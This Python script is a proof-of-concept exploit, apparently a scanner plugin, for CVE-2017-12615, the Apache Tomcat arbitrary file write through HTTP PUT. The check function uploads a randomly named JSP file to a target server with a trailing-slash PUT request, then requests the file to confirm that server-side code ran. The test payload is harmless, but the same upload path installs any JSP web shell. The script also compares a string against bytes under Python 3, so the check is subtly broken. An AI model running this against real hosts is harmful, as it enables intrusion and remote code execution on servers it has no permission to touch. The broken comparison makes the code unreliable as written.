# coding:utf-8
# author:nearg1e

''' poc for CVE-2017-12615 '''
import urllib.request, urllib.error, urllib.parse
import random
import string
import urllib.parse


def get_plugin_info():
    plugin_info = {
        "name": "Tomcat 任意写文件漏洞",
        "info": "通过PUT方法上传任意文件，可以达到任意代码执行的效果",
        "level": "高危",
        "type": "代码执行",
        "author": "neargle@YSRC",
        "url": "https://paper.seebug.org/398/",
        "keyword": "tag:tomcat",
        "source": 1
    }
    return plugin_info


class PutRequest(urllib.request.Request):
    '''support put method in urllib2'''
    def __init__(self, *args, **kwargs):
        self._method = "PUT"
        return urllib.request.Request.__init__(self, *args, **kwargs)

    def get_method(self, *args, **kwargs):
        return "PUT"

def random_str(length):
    pool = string.digits + string.ascii_lowercase
    return "".join(random.choice(pool) for _ in range(length))

def check(host, port, timeout):
    result = ""
    payload = "<%out.println(1963*4);%>"
    filename = "{}.jsp".format(random_str(16))
    if port == 443:
        url = "https://%s" % (host)
    else:
        url = "http://%s:%d" % (host, port)
    url = urllib.request.urlopen(url, timeout=timeout).geturl()
    shell_url = urllib.parse.urljoin(url, filename)
    target_url = shell_url + "/"
    request = PutRequest(target_url, payload)
    try:
        urllib.request.urlopen(request, timeout=timeout)
    except Exception as e:
        print(("[!] {}".format(str(e))))
        return False
    else:
        try:
            resp = urllib.request.urlopen(shell_url, timeout=timeout)
        except Exception as e:
            print(("[!] get shell url error {}".format(str(e))))
            return False
        else:
            if "7852" in resp.read():
                result += "存在任意代码执行风险"
                result += " 地址: {}".format(shell_url)
                return result

if __name__ == '__main__':
    print((check("127.0.0.1", 8080, 5)))
    